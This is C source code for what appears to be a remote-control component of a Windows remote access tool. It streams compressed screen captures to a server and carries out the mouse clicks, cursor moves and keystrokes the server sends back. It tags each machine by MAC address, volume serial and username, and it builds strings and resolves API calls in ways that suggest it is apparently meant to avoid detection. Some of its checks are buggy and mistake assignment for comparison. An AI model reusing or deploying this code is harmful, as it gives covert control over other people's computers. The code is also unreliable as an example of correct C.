

#include <windows.h>
#include "RemoteControlProc.h"
#include "GetScreenFrame.h"
#include "../log.h"

#define REMOTE_CLIENT_SCREEN_MIN_INTERVAL	20

#define REMOTE_CLIENT_SCREEN_MAX_INTERVAL	2000

#define REMOTE_CLIENT_SCREEN_ADDINTERVAL	10


ULONGLONG g_current_tickcnt = 0;

DWORD g_delay_flag = 0;




int makeNoneScreenPacket(char* lpZlibBuf) {
	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpZlibBuf;
	lphdr->cmd = REMOTE_NONE_SCREEN;
	lphdr->packlen = 0;
	memmove(lphdr->unique.cMAC, cMAC, MAC_ADDRESS_LENGTH);
	lphdr->unique.compress = DATANONECOMPRESS;
	lphdr->unique.crypt = DATANONECRYPT;
	lphdr->unique.dwVolumeNO = ulVolumeSerialNo;
	memset(lphdr->unique.username, 0, USERNAME_LIMIT_SIZE);
	lstrcpyA((char*)lphdr->unique.username, (char*)gUserName);
	return sizeof(NETWORKPACKETHEADER);
}


DWORD __stdcall RemoteControlProc(int bitsperpix, char* lpBuf, int BufLen, char* lpZlibBuf, int ZlibBufLen, SOCKET hSock, char* lpBackup, char* pixels)
{
	char szScreenDCName[] = { 'D','I','S','P','L','A','Y',0 };

	int iRet = 0;

	int framecnt = 0;

	DWORD dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;

	//__debugbreak();

	g_current_tickcnt = GetTickCount64();

	LARGE_INTEGER freq;
	LARGE_INTEGER begin;
	LARGE_INTEGER end;

	QueryPerformanceFrequency(&freq);

	while (TRUE)
	{
		QueryPerformanceCounter(&begin);

		int dwbmbitssize = 0;
		char* pixelData = 0;
		int dwBufSize = GetScreenFrame(bitsperpix, szScreenDCName, 0, 0, ScrnResolutionX, ScrnResolutionY, lpBuf, &pixelData, &dwbmbitssize);
		if (dwBufSize <= 0 || dwBufSize > REMOTECONTROL_BUFFER_SIZE || dwbmbitssize > REMOTECONTROL_BUFFER_SIZE || dwbmbitssize <= 0)
		{
			writeLog("RemoteControlProc GetScreenFrame size:%d error\r\n", dwBufSize);

			checkTime(&dwSleepTimeValue);
			continue;
		}

		int sendlen = 0;
		int byteperpix = bitsperpix / 8;
		int changecnt = ScreenFrameChecker(lpBackup, pixelData, dwbmbitssize, pixels, byteperpix);
		if (changecnt <= 0)
		{
			freeInterval(&dwSleepTimeValue);

			sendlen = makeNoneScreenPacket(lpZlibBuf);

			//sendlen = makeNoneScreenPacket(lpZlibBuf);
		}
		else {
			int totalpix = changecnt * (sizeof(DWORD) + byteperpix);
			if (totalpix < REMOTECONTROL_BUFFER_SIZE / 2)
			{
				LPNETWORKFILEHDR lpfhdr = (LPNETWORKFILEHDR)lpZlibBuf;
				lpfhdr->packhdr.cmd = REMOTE_PIXEL_PACKET;
				LPUNIQUECLIENTSYMBOL lpUnique = (LPUNIQUECLIENTSYMBOL) & (lpfhdr->packhdr.unique);
				memmove(lpUnique->cMAC, cMAC, MAC_ADDRESS_LENGTH);
				lpUnique->compress = DATANONECOMPRESS;
				lpUnique->crypt = DATANONECRYPT;
				lpUnique->dwVolumeNO = ulVolumeSerialNo;

				long complen = ZlibBufLen - sizeof(NETWORKFILEHDR);
				iRet = compress2((Bytef*)lpZlibBuf + sizeof(NETWORKFILEHDR), (uLongf*)&complen, (const Bytef*)pixels, (uLongf)totalpix, 9);
				if (iRet != Z_OK)
				{
					writeLog("RemoteControlProc compress error code:%d,flat buffer size:%u,compress buffer size:%u\r\n", iRet, totalpix, complen);

					checkTime(&dwSleepTimeValue);

					continue;
				}
				framecnt++;
				if (framecnt % 10 == 0)
				{
					writeLog("RemoteControlProc compress zip result size:%u,unzip size:%u\r\n", complen, totalpix);
				}

				lpfhdr->packhdr.packlen = sizeof(int) + complen;
				lpfhdr->srclen = dwBufSize;
				sendlen = complen + sizeof(NETWORKFILEHDR);
			}
			else {
				LPNETWORKFILEHDR lpfhdr = (LPNETWORKFILEHDR)lpZlibBuf;
				lpfhdr->packhdr.cmd = REMOTE_CLIENT_SCREEN;
				LPUNIQUECLIENTSYMBOL lpUnique = (LPUNIQUECLIENTSYMBOL) & (lpfhdr->packhdr.unique);
				memmove(lpUnique->cMAC, cMAC, MAC_ADDRESS_LENGTH);
				lpUnique->compress = DATANONECOMPRESS;
				lpUnique->crypt = DATANONECRYPT;
				lpUnique->dwVolumeNO = ulVolumeSerialNo;

				long complen = ZlibBufLen - sizeof(NETWORKFILEHDR);
				iRet = compress2((Bytef*)lpZlibBuf + sizeof(NETWORKFILEHDR), (uLongf*)&complen, (const Bytef*)lpBuf, (uLongf)dwBufSize, 9);
				if (iRet != Z_OK)
				{
					writeLog("RemoteControlProc compress error code:%d,flat buffer size:%u,compress buffer size:%u\r\n", iRet, dwBufSize, complen);

					checkTime(&dwSleepTimeValue);

					continue;
				}
				framecnt++;
				if (framecnt % 10 == 0)
				{
					writeLog("RemoteControlProc compress result zip size:%u,unzip size:%u\r\n", complen, dwBufSize);
				}

				lpfhdr->packhdr.packlen = sizeof(int) + complen;
				lpfhdr->srclen = dwBufSize;
				sendlen = complen + sizeof(NETWORKFILEHDR);
			}
		}

		int sendSize = lpsend(hSock, lpZlibBuf, sendlen, 0);
		if (sendSize <= 0)
		{
			writeLog("RemoteControlProc lpsend error code:%u\r\n", GetLastError());
			return NETWORK_ERROR_CODE;
		}

		int recvSize = lprecv(hSock, lpBuf, BufLen, 0);		//last packet can use MSG_WAITALL with enough buffer
		if (recvSize < sizeof(NETWORKPACKETHEADER))
		{
			writeLog("RemoteControlProc recv error code:%u\r\n", lpRtlGetLastWin32Error());
			return NETWORK_ERROR_CODE;
		}
		LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpBuf;
		DWORD dwCommand = lphdr->cmd;
		int dataSize = lphdr->packlen;
		if (dataSize < 0 || (dataSize + sizeof(NETWORKPACKETHEADER) > BufLen))
		{
			writeLog("RemoteControlProc datasize:%d error\r\n", dataSize);
			return NETWORK_ERROR_CODE;
		}
		while (recvSize - sizeof(NETWORKPACKETHEADER) < dataSize)
		{
			int nextSize = lprecv(hSock, lpBuf + recvSize, BufLen - recvSize, 0);
			if (nextSize > 0)
			{
				recvSize += nextSize;
			}
			else {
				writeLog("RemoteControlProc recv size:%u, datasize:%d error:%d\r\n", recvSize, dataSize, lpRtlGetLastWin32Error());
				return NETWORK_ERROR_CODE;
			}
		}

		QueryPerformanceCounter(&end);
		double cost = (end.QuadPart - begin.QuadPart);
		cost = (cost * 1000000 / freq.QuadPart);
		if (framecnt % 10 == 0)
		{
			writeLog("one frame cost:%I64d us\r\n", (unsigned __int64)cost);
		}


		if (dwCommand == REMOTE_MOUSE_POS)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(POINT) + sizeof(POINT))
			{
				LPREMOTECONTROLPOS pos = (LPREMOTECONTROLPOS)(lpBuf + sizeof(NETWORKPACKETHEADER));
				POINT stServerCurrent = pos->pos;
				POINT stPtServerMax = pos->size;

				int iXLocalMax = ScrnResolutionX;
				int iYLocalMax = ScrnResolutionY;

				POINT stPtLocalCurrent = { 0 };
				if (stPtServerMax.x != 0 && stPtServerMax.y != 0)
				{
					stPtLocalCurrent.x = (iXLocalMax * stServerCurrent.x) / stPtServerMax.x;
					stPtLocalCurrent.y = (iYLocalMax * stServerCurrent.y) / stPtServerMax.y;
					//mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE,stPtLocalCurrent.x,stPtLocalCurrent.y,0,0);
					lpSetCursorPos(stPtLocalCurrent.x, stPtLocalCurrent.y);
				}
			}

			actionInterval(&dwSleepTimeValue);

			//checkTime(&dwSleepTimeValue);
			continue;
		}
		else if (dwCommand == REMOTE_KEYBOARD)
		{
			if (lphdr->packlen == 2)
			{
				LPREMOTECONTROLKEY lpkey = (LPREMOTECONTROLKEY)(lpBuf + sizeof(NETWORKPACKETHEADER));
				unsigned char key = lpkey->key;
				unsigned char keyshift = lpkey->shiftkey;

				//unsigned char szKeyboardState[256];
				//memmove(szKeyboardState,pData,256);
				//iRet = SetKeyboardState(pData);

				if (keyshift)
				{
					keybd_event(VK_SHIFT, 0, 0, 0);
					keybd_event(key, 0, 0, 0);
					keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
					keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
				}
				else {
					keybd_event(key, 0, 0, 0);
					keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
				}
			}
			actionInterval(&dwSleepTimeValue);

			//checkTime(&dwSleepTimeValue);

			continue;
		}
		else if (dwCommand == REMOTE_LEFTBUTTONDOWN || dwCommand == REMOTE_LEFTBUTTONDOUBLECLICK ||
			dwCommand == REMOTE_RBUTTONDOWN || dwCommand == REMOTE_RBUTTONDOUBLECLICK)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(POINT) + sizeof(POINT))
			{
				LPREMOTECONTROLPOS pos = (LPREMOTECONTROLPOS)(lpBuf + sizeof(NETWORKPACKETHEADER));
				POINT stServerCurrent = pos->pos;
				POINT stPtServerMax = pos->size;

				int iXLocalMax = ScrnResolutionX;
				int iYLocalMax = ScrnResolutionY;

				POINT stPtLocalCur = { 0 };
				if (stPtServerMax.x != 0 && stPtServerMax.y != 0)
				{
					stPtLocalCur.x = (iXLocalMax * stServerCurrent.x) / stPtServerMax.x;
					stPtLocalCur.y = (iYLocalMax * stServerCurrent.y) / stPtServerMax.y;
					lpSetCursorPos(stPtLocalCur.x, stPtLocalCur.y);
					if (dwCommand == REMOTE_LEFTBUTTONDOWN)
					{
						mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
						mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
					}
					else if (dwCommand == REMOTE_RBUTTONDOWN)
					{
						mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
						mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
					}
					else if (dwCommand == REMOTE_RBUTTONDOUBLECLICK)
					{
						mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
						lpSleep(0);
						mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
					}
					else if (dwCommand == REMOTE_LEFTBUTTONDOUBLECLICK)
					{
						mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
						lpSleep(0);
						mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
					}
				}
			}

			actionInterval(&dwSleepTimeValue);
			//checkTime(&dwSleepTimeValue);
			continue;
		}
		else if (dwCommand == REMOTE_MOUSEWHEEL)
		{
			DWORD dwDataSize = lphdr->packlen;
			if (dwDataSize = sizeof(DWORD) + sizeof(DWORD))
			{
				LPREMOTECONTROLWHEEL wheel = (LPREMOTECONTROLWHEEL)(lpBuf + sizeof(NETWORKPACKETHEADER));
				int key = wheel->delta & 0xffff;
				int delta = wheel->delta >> 16;
				int x = wheel->xy & 0xffff;
				int y = wheel->xy & 0xffff0000;

				mouse_event(MOUSEEVENTF_WHEEL, x, y, delta, 0);
				lpSleep(0);
			}

			actionInterval(&dwSleepTimeValue);

			//checkTime(&dwSleepTimeValue);
			continue;
			//to action more faster not to sleep
		}
		else if (dwCommand == RECV_DATA_OK || dwCommand == REMOTE_DUMMY_PACKET)
		{
			freeInterval(&dwSleepTimeValue);
		}
		else if (dwCommand == REMOTECONTROL_END)
		{
			writeLog("remotecontrol shutdown by server\r\n");
			break;
		}
		else
		{
			writeLog("RemoteControlProc unrecognized command:%u\r\n", dwCommand);
			//break;
		}

		checkTime(&dwSleepTimeValue);
	}

	return FALSE;
}

int checkTime(DWORD* dwSleepTimeValue) {
	unsigned long cur_tickcnt = GetTickCount64();
	ULONGLONG time_gap = cur_tickcnt - g_current_tickcnt;
	g_current_tickcnt = cur_tickcnt;
	if (time_gap >= *dwSleepTimeValue)
	{

	}
	else {
		unsigned long delta = *dwSleepTimeValue - time_gap;
		//delay(&delta);
		lpSleep(delta);
	}
	return time_gap;
}

#define DETECT_INTERVAL			1


int delay(DWORD* dwSleepTimeValue) {

	int cnt = *dwSleepTimeValue / REMOTE_CLIENT_SCREEN_MIN_INTERVAL;
	if (cnt == 0)
	{
		cnt = 1;
	}
	g_delay_flag = 0;
	for (int i = 0; i < cnt; i++)
	{
		lpSleep(REMOTE_CLIENT_SCREEN_MIN_INTERVAL);
		if (g_delay_flag)
		{
			g_delay_flag = 0;
			break;
		}
	}

	return cnt;
}

int actionInterval(DWORD* dwSleepTimeValue) {
	*dwSleepTimeValue = (*dwSleepTimeValue) / 4;
	if (*dwSleepTimeValue <= REMOTE_CLIENT_SCREEN_MIN_INTERVAL)
	{
		*dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MIN_INTERVAL;
	}
	return *dwSleepTimeValue;
}

int freeInterval(DWORD* dwSleepTimeValue) {
	(*dwSleepTimeValue) += REMOTE_CLIENT_SCREEN_ADDINTERVAL;
	if (*dwSleepTimeValue >= REMOTE_CLIENT_SCREEN_MAX_INTERVAL)
	{
		*dwSleepTimeValue = REMOTE_CLIENT_SCREEN_MAX_INTERVAL;
	}
	return *dwSleepTimeValue;
}

int ScreenFrameChecker(char* backup, char* color, int colorlen, char* buf, int bytesperpix) {

	int counter = 0;

	if (bytesperpix == 4)
	{
		DWORD* lpback = (DWORD*)backup;
		DWORD* lpcolor = (DWORD*)color;

		for (int i = 0; i < colorlen / bytesperpix; i++)
		{
			if (lpback[i] != lpcolor[i]) {

				lpback[i] = lpcolor[i];

				char* lppixel = buf + counter * (sizeof(DWORD) + bytesperpix);
				*(DWORD*)lppixel = i * 4;

				*(DWORD*)(lppixel + sizeof(DWORD)) = lpcolor[i];

				counter++;
			}
		}
	}
	else if (bytesperpix == 3)
	{
		char* lpback = (char*)backup;
		char* lpcolor = (char*)color;

		for (int i = 0; i < colorlen / bytesperpix; i += 3)
		{
			if (lpback[i] != lpcolor[i] || lpback[i + 1] != lpcolor[i + 1] || lpback[i + 2] != lpcolor[i + 2]) {

				lpback[i] = lpcolor[i];
				lpback[i + 1] = lpcolor[i + 1];
				lpback[i + 2] = lpcolor[i + 2];

				char* lppixel = buf + counter * (sizeof(DWORD) + bytesperpix);
				*(DWORD*)lppixel = i;

				*(lppixel + sizeof(DWORD)) = lpcolor[i];
				*(lppixel + sizeof(DWORD) + 1) = lpcolor[i + 1];
				*(lppixel + sizeof(DWORD) + 2) = lpcolor[i + 2];

				counter++;
			}
		}
	}
	else if (bytesperpix == 2)
	{
		WORD* lpback = (WORD*)backup;
		WORD* lpcolor = (WORD*)color;

		for (int i = 0; i < colorlen / bytesperpix; i++)
		{
			if (lpback[i] != lpcolor[i]) {

				lpback[i] = lpcolor[i];

				char* lppixel = buf + counter * (sizeof(DWORD) + bytesperpix);
				*(DWORD*)lppixel = i * 2;

				*(WORD*)(lppixel + sizeof(DWORD)) = lpcolor[i];

				counter++;
			}
		}
	}
	else if (bytesperpix == 1)
	{
		char* lpback = (char*)backup;
		char* lpcolor = (char*)color;

		for (int i = 0; i < colorlen / bytesperpix; i++)
		{
			if (lpback[i] != lpcolor[i]) {

				lpback[i] = lpcolor[i];

				char* lppixel = buf + counter * (sizeof(DWORD) + bytesperpix);
				*(DWORD*)lppixel = i;

				*(char*)(lppixel + sizeof(DWORD)) = lpcolor[i];

				counter++;
			}
		}
	}
	else {
		return FALSE;
	}

	return counter;

}